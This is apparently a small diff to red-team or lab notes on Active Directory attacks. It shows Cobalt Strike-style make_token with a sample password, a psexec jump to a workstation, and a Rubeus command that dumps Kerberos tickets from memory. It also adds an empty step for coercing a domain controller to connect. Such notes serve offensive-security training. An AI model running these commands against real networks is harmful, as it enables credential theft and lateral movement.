@@ -10,12 +10,18 @@ make_token CONTOSO\rsteel Passw0rd!
 jump psexec64 lon-ws-1 smb
 ```
 
-Few options here: 
+> Few options here: 
 
 1.  Dump tickets from memory (hopefully a DA is here)
 
 ```powershell
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /nowrap
+```
+
+2. Perform coercion to make a high level machine (DC) connect
+
+```powershell
+
 ```
 
 
